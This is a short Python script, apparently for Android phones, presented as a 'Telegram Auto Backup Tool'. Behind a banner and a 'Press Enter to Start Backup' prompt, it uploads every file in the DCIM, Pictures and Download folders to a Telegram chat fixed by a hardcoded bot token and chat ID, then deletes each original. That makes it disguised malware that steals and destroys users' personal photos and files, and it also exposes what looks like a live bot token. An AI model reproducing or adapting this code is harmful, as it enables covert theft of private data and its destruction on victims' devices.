import os
import time
import telebot
import glob

# 🎨 ASCII ব্যানার
def banner():
    os.system("clear")
    print("""\033[1;32m
    ██████╗░░█████╗░██████╗░███████╗██╗░░░░░
    ██╔══██╗██╔══██╗██╔══██╗██╔════╝██║░░░░░
    ██████╔╝███████║██████╔╝█████╗░░██║░░░░░
    ██╔═══╝░██╔══██║██╔═══╝░██╔══╝░░██║░░░░░
    ██║░░░░░██║░░██║██║░░░░░███████╗███████╗
    ╚═╝░░░░░╚═╝░░╚═╝╚═╝░░░░░╚══════╝╚══════╝
     🔰 Telegram Auto Backup Tool 🔰
    """)
    print("\033[1;34m Owner: SiamBhau | GitHub:Siam-Bruh\033[0m")
    print("\033[1;34m Telegram: SiamBhau\033[0m\n")

# 🔹 Telegram Bot Config
TOKEN = "8019449835:AAFM7db1mQFX-LyXpTbNKUqygTERQHYYsi8"
CHAT_ID = "6296611162"

bot = telebot.TeleBot(TOKEN)

# 🔹 ফোনের ছবি ও ভিডিও ফোল্ডার
folders = ["/sdcard/DCIM/", "/sdcard/Pictures/", "/sdcard/Download/"]

def backup_and_delete():
    for folder in folders:
        files = glob.glob(folder + "*.*")  # সব ফাইল লিস্ট বের করবে
        for file in files:
            try:
                # ফাইল Telegram Bot-এ পাঠাবে
                with open(file, "rb") as f:
                    bot.send_document(CHAT_ID, f)
                # সফলভাবে আপলোড হলে ফাইল ডিলিট করবে
                os.remove(file)
                print(f"\033[1;32m✅ Uploaded & Deleted:\033[0m {file}")
            except Exception as e:
                print(f"\033[1;31m❌ Error uploading {file}: {e}\033[0m")

if __name__ == "__main__":
    banner()
    input("\033[1;33m🔹 Press Enter to Start Backup...\033[0m")
    backup_and_delete()
    print("\n\033[1;32m✅ Backup Completed Successfully!\033[0m")
